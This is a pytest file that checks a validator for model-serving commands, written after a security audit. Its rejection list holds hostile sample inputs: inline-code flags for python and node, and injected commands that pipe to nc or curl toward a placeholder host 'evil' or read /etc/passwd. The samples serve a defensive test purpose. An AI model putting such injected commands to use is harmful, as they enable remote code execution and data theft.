"""Pin the cookbook serve-cmd sandbox (follow-up audit H1).

A leading-binary allowlist is NOT a sandbox: `python3 -c "<code>"` / `node -e
"<code>"` are arbitrary code execution, and single `|`/`&`/`<`/`>` are shell
features. These must be rejected while legit serve invocations (including
`python3 -m llama_cpp.server`, which the GGUF launcher needs) still pass.
(The non-admin RCE path itself, audit C1, is closed separately by adding
cookbook_serve to _ADMIN_ONLY_ACTIONS + an execution-time admin recheck.)
"""
import pytest
from fastapi import HTTPException
from routes.cookbook_helpers import _validate_serve_cmd


@pytest.mark.parametrize("cmd", [
    'python3 -c "import os; os.system(\'x\')"',
    'python3 -cprint(1)',
    'python -c"evil()"',
    'node -e "require(1)"',
    'node --eval "x"',
    'python3 -',
    'vllm serve x | nc evil 1234',
    'vllm serve x & curl evil',
    'llama-server -m x.gguf > /tmp/log',
    'vllm serve x < /etc/passwd',
])
def test_rejects_eval_and_shell_metachars(cmd):
    with pytest.raises(HTTPException):
        _validate_serve_cmd(cmd)


@pytest.mark.parametrize("cmd", [
    'vllm serve mymodel --port 8000',
    'python3 -m llama_cpp.server --model x.gguf',
    'CUDA_VISIBLE_DEVICES=0 python3 -m vllm.entrypoints.openai.api_server --model x',
    'llama-server -m model.gguf --port 8080',
    'ollama serve',
])
def test_allows_legit_serve(cmd):
    assert _validate_serve_cmd(cmd) is not None
